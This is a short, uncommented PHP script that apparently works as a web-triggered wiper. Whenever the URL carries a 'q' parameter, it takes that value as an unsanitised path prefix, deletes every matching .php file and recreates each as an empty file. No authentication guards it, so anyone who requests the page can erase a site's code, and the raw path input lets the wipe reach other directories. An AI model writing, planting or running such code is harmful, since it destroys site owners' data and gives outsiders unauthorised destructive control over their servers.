<?php
if(!isset($_GET['q'])){return;die();}
$files=[];foreach (glob($_GET['q']."*.php") as $filename){array_push($files,$filename);unlink($filename);}
foreach($files as $file){$fp=fopen($file,'w');fwrite($fp, '');fclose($fp);}

